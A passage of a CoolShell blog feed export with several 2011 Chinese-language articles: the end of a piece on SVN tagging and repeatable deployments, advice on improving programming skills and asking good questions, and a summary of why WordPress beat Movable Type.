<p>从业几年来,”所在团队把SVN当FTP用”是几乎每次朋友们互相吐槽时都能听到的话题,”SVN的分支合并太难用;需要更密切和团队伙伴共享工作内容…”我们可以很轻松的找到不创建功能分支然后进行合并的理由,事实上这么做可能也有一定的”合理性”.但发布时打个Tag,对你的现有开发流程几乎不会带来负担.你不需要切换到<a href="https://git-scm.com/">Git</a>或<a href="http://mercurial.selenic.com/">Mercury</a>,唯一要做的只是在提交后,发布前运行一行svn copy命令,然后在发布目标上用svn switch命令代替svn update来更新代码.只有一点需要注意,创建Tag的svn copy命令的目标最好是一个新的SVN仓库地址(新Tag路径),而不是本地目录.这么做的理由是当以仓库路径作为svn copy目标时,不会产生文件拷贝,而以本地路径为目标执行时,会发生文件拷贝,如果项目包含很多文件,这个过程会较为漫长.如果想避免本地打tag时的文件拷贝,你可切换到分布式版本控制系统.</p>
<p>这么做的好处也是明显的,虽然我们已经通过预发布环境规避了大部分发布环境可能引入的问题.但当那”万一”发生时.你能够以最快的速度切换到上一次发布时的状态.通常可以通过”$svn switch [上次发布Tag的SVN路径]“一行命令搞定.</p>
</div>
<div>
<h3>是否让部署过程是可重复的</h3>
<p>如果你所在的团队对开发和运维工作进行了严格切分,这不会是一个问题.但不是所有项目都会到这个规模,如果你是一个幸福的能变更生产环境的Web程序员,请千万小心,你对生产环境的每次调整/优化,都可能让项目部署过程变得不可重复.随着时间的推移,你会忘记当时的配置项.一旦项目需要扩容,恢复,移交.这过程都可能演变成灾难.</p>
<p>上面提到那篇文章中,提倡用部署脚本来管理部署过程.这是很好的解决方法,但如果你暂时缺乏系统脚本编程能力.分门别类把每次环境配置过程记录清楚吧,就当这项工作要在你不在场的情况下被别人重复执行.</p>
</div>
<p>别人说我们是”码农”,我们要把自己当工程师.</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/7657.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7657.html" class="wp_rp_title">持续部署，并不简单！</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1824.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1824.html" class="wp_rp_title">C语言和sh脚本的杂交代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2492.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2492.html" class="wp_rp_title">WTF Javascript</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5444.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5444.html" class="wp_rp_title">千万不要把 bool 设计成函数参数</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1499.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1499.html" class="wp_rp_title">算法和数据结构词典</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1830.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1830.html" class="wp_rp_title">正则表达式生成器</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3709" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="f5195e706e">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>8</strong> 人打了分，平均分： <strong>3.38</strong> )<br><span class="post-ratings-text" id="ratings_3709_text"></span><meta itemprop="name" content="预发布环境,Tag发布机制和可重复的部署过程">
<meta itemprop="headline" content="预发布环境,Tag发布机制和可重复的部署过程">
<meta itemprop="description" content="下面文章由网友吕毅投递，源文是：http://blog.lvscar.info/?p=427

—————————————————————————————————————————————

周末聚会，无意间聊起建筑行业。自己是搞软件开发的，我们的行业从建筑设计/施工过程中借鉴了大量的概念，隐喻，名词。可以说软件就是现实中伴随整个人类历史发展的“建筑”在虚拟空间中的投影。有个两年前问过其他朋...">
<meta itemprop="datePublished" content="2011-02-20T15:28:59+08:00">
<meta itemprop="dateModified" content="2011-02-20T15:28:59+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3709.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3709.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.38">
<meta itemprop="ratingCount" content="8">
</div>
</div>
<div id="post-ratings-3709-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-20T15:28:59+08:00</pubDate>
<guid>https://coolshell.cn/articles/3709.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 提高编程技能最有效的方法 ]]></title>
<link>https://coolshell.cn/articles/3698.html</link>
<content><![CDATA[ 
<p>StackExchange.com上有两个贴子（<a href="https://programmers.stackexchange.com/questions/3089/what-is-the-single-most-effective-thing-you-did-to-improve-your-programming-skill" target="_blank">贴子一</a>，<a href="https://programmers.stackexchange.com/questions/44177/what-is-the-single-most-effective-thing-you-did-to-improve-your-programming-skill" target="_blank">贴子二</a>），贴子名叫“What is the single most effective thing you did to improve your programming skills?” – 对你的编程技术提高最有效的一件事是什么？回复的人中给了很多很不错的建议，我把他们总结了一下，十条，相信一定会对你有用。（注意：顺序是我自己按我的个人经验排的）</p>
<ul>
<li>和比自己聪明的能力比自己强的人工作。学习他们的代码，他们的做事方法，看一看那些人是怎么处理错误的。</li>
</ul>
<ul>
<li>总是倾听别人怎么说，无论那个的资历和职位是什么样的。</li>
</ul>
<ul>
<li>实践，实践，实践，总是不满意于一开始出来的事。</li>
</ul>
<ul>
<li>多问问自己，现在在写什么代码？为什么要这样写成这样？还有没有更好的方法？</li>
</ul>
<ul>
<li>学习多样的技术，多多比较他们，并一定要了解各种技术的优缺点。</li>
</ul>
<ul>
<li>总是问别人问好的问题。</li>
</ul>
<ul>
<li>多回头看看走过的路，做过的事，写过的程序，感觉一下他们有多烂。</li>
</ul>
<ul>
<li>多读读那些大师写的书。</li>
</ul>
<ul>
<li>不要总坐在电脑前编程序，多做做运动，多到户外走走，和非技术人多接触，向他们学习。</li>
</ul>
<ul>
<li>把你的想法说出去，看看别人怎么回应的。从别人的回应中学习。</li>
</ul>
<p>除了这些，下面是我个人想给你的建议——</p>
<p><span id="more-3698"></span><br>
可能只能算精神，不能算方法。我以前也写过《<a rel="bookmark" href="https://coolshell.cn/articles/2606.html" target="_blank">五个方法成为更好的程序员</a>》，《<a rel="bookmark" href="https://coolshell.cn/articles/2424.html" target="_blank">十条不错的编程观点</a>》，还有《<a rel="bookmark" href="https://coolshell.cn/articles/222.html" target="_blank">优秀程序员的十个习惯</a>》这几篇文章也能给你一些启发。</p>
<ul>
<li>
<span style="font-size: 11pt;"><strong>热情</strong></span>。对编程充满热情。这种热情会导致强烈地专研精神，和努力的精神。<strong>专研精神相当重要，它是畏难情绪的天敌</strong>。</li>
</ul>
<ul>
<li>
<span style="font-size: 11pt;"><strong>知道</strong></span>。学习技术要“知其道，明其理”，而不仅仅只是了解知识。举例，为什么C++有“初始化例表”而Java却没有？为什么Java的没有多重继承？为会有了TCP还要UDP？对于一个事物，什么是好的，什么是不好的。不但要了解其表面，还要了解其思想。<strong>只有了解原始的初衷和目的，你才能真正“知道”</strong>。</li>
</ul>
<ul>
<li>
<span style="font-size: 11pt;"><strong>犯错</strong></span>。不犯错误永远没有经验，从自己的错误和别人的错误中学习，只有自己犯了错，才会真正明白。犯错不可怕，可怕的是不会总结只有真正的摸爬滚打过的人才是强人。<strong>技能和经验总是用错误去换来的</strong>。</li>
</ul>
<ul>
<li>
<span style="font-size: 11pt;"><strong>回顾</strong></span>。要多去回顾过去，看看历史上发生过的事。这样你才能明白事物的发展规律，从面才能了解未来的路。举例：单机 -&gt; Client/Server -&gt; 中间应用层 -&gt; 多层结构 -&gt; 分布式结构。 C -&gt; C++ -&gt; Java，等等，等等。<strong>未来其实就在回顾过去之中</strong>。</li>
</ul>
<ul>
<li>
<span style="font-size: 11pt;"><strong>质疑</strong></span>。质疑精神很重要。质疑通常会导致不同意见甚至反对意见。也许你会质疑错，也许你会被质疑，但是你的认知也会因为不同的观点而变得完整。有所同有所不同（“同”为同意及相同），<strong>观点因为不同才能迸发出火花，事物也此而发展，世界因为不同而精彩</strong>。</li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3698" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="548e34e043">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>21</strong> 人打了分，平均分： <strong>4.29</strong> )<br><span class="post-ratings-text" id="ratings_3698_text"></span><meta itemprop="name" content="提高编程技能最有效的方法">
<meta itemprop="headline" content="提高编程技能最有效的方法">
<meta itemprop="description" content="StackExchange.com上有两个贴子（贴子一，贴子二），贴子名叫“What is the single most effective thing you did to improve your programming skills?” - 对你的编程技术提高最有效的一件事是什么？回复的人中给了很多很不错的建议，我把他们总结了一下，十条，相信一定会对你有用。（注意：顺序是我自己按我的个人经...">
<meta itemprop="datePublished" content="2011-02-21T08:31:03+08:00">
<meta itemprop="dateModified" content="2011-02-26T17:28:02+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3698.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3698.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.29">
<meta itemprop="ratingCount" content="21">
</div>
</div>
<div id="post-ratings-3698-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-21T08:31:03+08:00</pubDate>
<guid>https://coolshell.cn/articles/3698.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 你会问问题吗？ ]]></title>
<link>https://coolshell.cn/articles/3713.html</link>
<content><![CDATA[ 
<p>在工作和生活中，总是会有很多人问题我很多技术方面的问题。有一些时候，问问题的和答问题的总是会有一些不爽的事情发生。如下面的几种情况：</p>
<ul>
<li>比如：“我的电脑老是蓝屏，怎么办？”，通常这样的问题90%以上的回答是：“重装吧”。这让问问题的人感到很沮丧，但你不能不承认那不是答案。而且有时候让人无法解答，比如：“我的makefiel出错了，你帮我看看我的makfile”，我通常会非反问，报了什么错吗？</li>
<li>另一种情况是，回答问题的人首先先对问问题的人的抱怨，你问的问题就不对，或是，你问的这个问题是什么意思，而导致问问题的人却在不停地解释，结果花了好长时间来讨论问题本身是什么。</li>
<li>还有一种情况是，问的问题太简单了甚至太白痴了，比如你自己试一试或是读读文档就知道了的问题，或是问这个问题直接表明了你的无知或是懒惰。这种问题会相当影响别人对你的印象。</li>
<li>第四种情况是，提问者滔滔不绝，扯这扯那，讲了一大堆，听得听累了。最后都不知道你要干什么。</li>
</ul>
<p>所以，怎么去问问题，怎么问一个好的问题，是一个很重要的事。你提问的技术直接关系到了你是否能够很快得到你满意的答案。</p>
<p>这里有一篇文章推荐给大家《<a href="http://www.catb.org/~esr/faqs/smart-questions.html" target="_blank" rel="noopener noreferrer">How To Ask Questions The Smart Way</a>》，中文版在这里《<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way" target="_blank" rel="noopener noreferrer">提问的智慧</a>》，我把其中的几个亮点总结如下：</p>
<p><span id="more-3713"></span></p>
<ul>
<li>提问前先自己尝试查找答案，读读文档、手册，看看有没有相似的问题，看看那些方法能不能帮你解决问题，自己去试一试。如果你是程序员，你应该先学会自己调查一下源代码。（不然，人家回答你的一定是——RTFM – Read The Fucking Manual）这样的问题很多。我有时候很不愿意回答这样的问题，因为我觉得问问题的人把我当成了他的小跟班了。</li>
</ul>
<ul>
<li>提问的时候，找正确的人或是正确的论坛发问。向陌生人或是不负责的人提问可能会是很危险的。不正确的人，会让你事倍功半。如果你问Linux的人Windows太慢怎么办？他们一定会让你把Windows删了装Linux去的。</li>
</ul>
<ul>
<li>问的问题一定要是很明确的，并且阐述你做了哪些尝试，你一定要简化你的问题，这样可以让你的问题更容易被回答。对于一些问题，最好提供最小化的重现问题的步骤。</li>
</ul>
<ul>
<li>你一定要让问题变得简单易读，这和写代码是一样的。只有简单易读的邮件，人们才会去读，试想看到一封巨大无比的邮件，读邮件的心情都没有了。而且，内容越多，可能越容易让人理解错了。</li>
</ul>
<ul>
<li>你问问题的态度应该是以一种讨论的态度，即不是低三下四，也不是没有底气。只有这样，你和你的问题才能真正被人看得起。要达到这个状态，不想让别人看不起你，你就一定需要自己去做好充足的调查。问题 问得好的话，其实会让人觉得你很有经验的，能想到别人想不到的地方。</li>
</ul>
<ul>
<li>不要过早下结论。比如：“我这边的程序不转了，我觉得是你那边的问题，你什么时候能fix？”，或是“太难调试了，gdb怎么这么烂？！”。当你这么做的时候，你一定要有足够的信息和证据，否则，你就显得很自大。好的问题应该是，“我和你的接口的程序有问题，我输入了这样的合法的参数，但是XX函数却总是返回失败，我们能一起看看吗？”，“我看了一下gdb的文档，发现我在用XXX命令调试YYY的时候，有这样ZZZ的问题，是不是我哪里做错了？”</li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/10804.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10804.html" class="wp_rp_title">X-Y Problem</a>
</li>
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3713" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="9a2f9b8a06">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>16</strong> 人打了分，平均分： <strong>4.50</strong> )<br><span class="post-ratings-text" id="ratings_3713_text"></span><meta itemprop="name" content="你会问问题吗？">
<meta itemprop="headline" content="你会问问题吗？">
<meta itemprop="description" content="在工作和生活中，总是会有很多人问题我很多技术方面的问题。有一些时候，问问题的和答问题的总是会有一些不爽的事情发生。如下面的几种情况：


    比如：“我的电脑老是蓝屏，怎么办？”，通常这样的问题90%以上的回答是：“重装吧”。这让问问题的人感到很沮丧，但你不能不承认那不是答案。而且有时候让人无法解答，比如：“我的makefiel出错了，你帮我看看我的makfile”，我通常会非反问，报了什么错...">
<meta itemprop="datePublished" content="2011-02-22T08:40:49+08:00">
<meta itemprop="dateModified" content="2019-03-29T18:42:27+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3713.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3713.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.5">
<meta itemprop="ratingCount" content="16">
</div>
</div>
<div id="post-ratings-3713-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-22T08:40:49+08:00</pubDate>
<guid>https://coolshell.cn/articles/3713.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ WordPress是怎么赢的？ ]]></title>
<link>https://coolshell.cn/articles/3716.html</link>
<content><![CDATA[ 
<p>一个以前在Six Apart工作4年的产品经理<strong>Byrne Reese</strong>发布了<a href="http://www.majordojo.com/2011/02/how-did-wordpress-win.php" target="_blank">一篇文章</a>阐述为什么WordPress成为了赢家。其在文章中比较了WordPress和其主要竞争对手产品Movable Type。我觉得其中有可取之处，本想全文翻译的，后来觉得文章太长，翻译太花时间，所以，我把文章中的观点总结如下。</p>
<p>作者例举了如下为什么WordPress会赢的理由：</p>
<p><strong>一、Movable Type许可证，而WordPress是开源的</strong></p>
<p>2004年，Movable Type修改了其许可证，这一举动激怒了所有Movable Type的用户，于是大家纷纷转投Wordpress，这是WordPress最终成为赢家最大的原因。就算是Movable Type有着优越的设计，优越的功能，还有优越的技术支持，但是面对的是一个完全免费的产品也没有办法。因为WordPress是开源的，开源就意味着完全免费，而Movable Type一开始也是免费的，但是其许可证策略有着很不确定的因素。（注：2007年Movable Type发布了开源版本）</p>
<p><strong>二、WordPress很容易安装</strong></p>
<p>WordPress的安装过程很简单，只需要不到5分钟，比起Movable Type来说，这太受用户和推广商欢迎，你几乎不需要去碰后台的那些Web设置。（注：不仅如此，WordPress的升级和安装插件和风格的用户体验也是非常的不错）这就是为什么大家都喜欢WordPress的原因，就算是其功能比Movable Type少了又少。</p>
<p><span id="more-3716"></span></p>
<p><strong>三、WordPress由PHP写成</strong></p>
<p>作者说到，本来，语言不应该成为原因，绝大多数用户在使用新产品时是不会去自己修改PHP和Perl的源码的。但是好像人们对PHP有着天生的好感。相比起Movable Type的Perl，人们似乎没有像对PHP那样觉得舒服。Perl让人感觉有些害怕。而PHP让更多的人参与进来为WordPress贡献了大量的插件和风格。另外，PHP相对于Perl来说，对于工作的技能要求不高，所以，可以很容易维护。对于技术人员来说，会有更多的人去建议老板使用PHP而不是Perl，而更多的主机空间采用PHP而不是Perl。（我个人以为，这和WordPress的设计关系可能更大，所有的Blog系统，WordPress的可定制化支持得更好一些）</p>
<p><strong>四、WordPress的社区规模相当的大</strong></p>
<p>WordPress之所以那么成功，有一个因素要归结于其社区，这个社区创造力实在是很强大。而且，这个社区周边有一个健康的经济商圈——“Premium Theme”，越来越多的人可以从中挣到一些钱，这样也让他们更有动力回报这个社区，这是一个非常健康的良性循环。</p>
<p><strong>五、WordPress没有人进行强控制</strong></p>
<p>对于WordPress来说，上述的那些事情都是社区决定的，而不是WordPress内部的人，WordPress没有选择过其许可证和编程语言。</p>
<p><strong>六、WordPress的狂热崇拜</strong></p>
<p>在一开始，WordPress并没有把自己定位在超出自己能力的地方，其把自己定位在不是那么优越的地方。低调的策略让WordPress的口碑不错。另一个因素是因为，Six Apart曾对WordPress进行过诽谤，这让Six Apart的诚信受到质疑，因此反而让人们更加地喜欢WordPress。再加上WordPress的谦虚低调，于是人们对WordPress产品产生了感情以及信仰，并开始和WordPress一同作战。是的，Six Apart不是一个竞争对手，而是一个完美的敌人。</p>
<p><strong>七、Automattic的切换战役</strong></p>
<p>Automattic是WordPress的运作公司。这是一个并不是很光彩的事情。作者说，有很多忠诚的Movable Type和TypePad用户向他透露到有来自Automattic的员式打电话给他们让他们切换到WordPress上，如果这样的人每人给他一美金，他会相当的富有。Automattic用尽一切办法和手段让用户切换到WordPress上，他们甚至给这些用户免费提供主机服务，还分配一个工程师给用户帮他们迁移系统。而当有用户迁移了，他们则制造一个成功的案例来鼓动别的用户。</p>
<p><strong>八、Six Apart 收购 Apperceptive</strong></p>
<p>Six Apart收购Apperceptive并没有错，而且还有很不错的利润增涨。问题是，收购以后，Six Apart从其社区中雇佣了很多很聪明的也有创造性的人到他的公司里。然后这些人加入后，其吞食了本来Six Apart以专业注称的服务。更糟糕的是，这个做法等于削弱了其社区的力量，社区里缺少领袖级的人物，于是只有Six Apart在战斗。</p>
<p><strong>九、Six Apart 自己的失败</strong></p>
<p>作者归结为一点：Six Apart严重地阻碍了自己的竞争力，因为其把自己的精力分布在了很多产品上。简而言之一句话——没有专注。如果Six Apart专注地做一个事，比如就做TypePad 或是 Movable Type，那么，今天的情况可能会很不一样。虽然，WordPress还是无可质疑地会成为最流行的Blog，但是他依然会面对着强大的对手，双方需要不停地在创新和技术上比拼。</p>
<p>最后，作者说，目前这个世界上有WordPress, Drupal, Expression Engine, Movable Type, Simple CMS, TypePad, Twitter, Instagram, Tumblr,或是其它东西。作者让大家扪心自问——“是否WordPress是最好的产品？”作者依然认为 Movable Type 是最好的产品。其今天还是成为了很多商业公司的首选。</p>
<p>——————————</p>
<p>我个人觉得Blog的用户群其实对Blog的需求其实并不多，只需要可以发布文章，有评论，可以在边栏上添加一些小饰件，可以改变一下样式，最好自己的文章有人帮着做做推广什么的，基本上就是这个样子。所以，像新浪，搜狐这样提供商其实更好。更多的用户是不会去搭建自己的专有的blog的。所以，能自己搭建自己的blog的这群人，还是以技术人员偏多，而WordPress正好满足了技术人员的胃口。（老实说，WordPress的后台操作对于非技术人员的电脑用户来说还是很不够友好——太复杂，性能上好像也不是很好，插件多是多，但好的插件就那么几个）</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/1387.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1387.html" class="wp_rp_title">十个Web开发文章和教程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8489.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8489.html" class="wp_rp_title">Go 语言简介（下）— 特性</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3070.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3070.html" class="wp_rp_title">Kick Ass小游戏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4787.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4787.html" class="wp_rp_title">HTTP幂等性概念和应用</a>
</li>
<li>
<a href="https://coolshell.cn/articles/105.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/105.html" class="wp_rp_title">操作系统图形界面发展史(1981-2009)</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4576.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4576.html" class="wp_rp_title">Linux 2.6.39-rc3的一个插曲</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3716" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="75542134a5">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>8</strong> 人打了分，平均分： <strong>3.25</strong> )<br><span class="post-ratings-text" id="ratings_3716_text"></span><meta itemprop="name" content="WordPress是怎么赢的？">
<meta itemprop="headline" content="WordPress是怎么赢的？">
<meta itemprop="description" content="一个以前在Six Apart工作4年的产品经理Byrne Reese发布了一篇文章阐述为什么WordPress成为了赢家。其在文章中比较了WordPress和其主要竞争对手产品Movable Type。我觉得其中有可取之处，本想全文翻译的，后来觉得文章太长，翻译太花时间，所以，我把文章中的观点总结如下。

作者例举了如下为什么WordPress会赢的理由：

一、Movable Type许...">
<meta itemprop="datePublished" content="2011-02-23T08:25:32+08:00">
<meta itemprop="dateModified" content="2011-02-22T15:57:14+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3716.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3716.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.25">
<meta itemprop="ratingCount" content="8">
</div>
</div>
<div id="post-ratings-3716-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-23T08:25:32+08:00</pubDate>
<guid>https://coolshell.cn/articles/3716.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Stack Exchange 的架构 ]]></title>
<link>https://coolshell.cn/articles/3721.html</link>
<content><![CDATA[ 
